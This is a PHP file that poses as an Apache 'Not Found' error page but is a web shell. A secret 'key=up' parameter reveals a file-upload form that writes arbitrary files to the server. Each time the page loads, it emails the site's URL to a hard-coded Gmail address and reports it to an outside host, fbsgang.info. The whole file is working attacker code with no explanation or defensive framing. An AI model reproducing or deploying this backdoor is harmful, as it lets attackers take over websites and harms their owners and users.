<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <center>
    </form></center>
<?php
if ($_GET['key'] == "up") {
echo '<style type="text/css">
body {
 color: black;
 background-color: white;
 font-weight: inherit;
}
h1,h2{
 background-color: #ffffff;
 color: #000000;
 text-align: center;
}
h3,h4,h5{
 color: black;
 text-align: center;
}
</style><b><br>
<h1> Uploading </h1>
<br><br>
<center>
<font color:"blue">
<span style="font-family: monospace;">
<span style="color: rgb(255, 255, 255);">
<br><br>
<font color="black"></font>
<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50">
<input name="_upl" type="submit" id="_upl" value="Upload">
</form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
{
echo '<b>success!</b><br><br>';
}
else
{
echo '<b>failed!</b><br><br></font>';
}
}}
$site = $_SERVER["SERVER_NAME"].$_SERVER['REQUEST_URI'];
$msg = "the website has been accessed from http://{$site}";
// send email
mail("simooow.fbs@gmail.com","my link",$msg);
//urldecode
file_get_contents("http://fbsgang.info/site/index.php?url=$site");
?>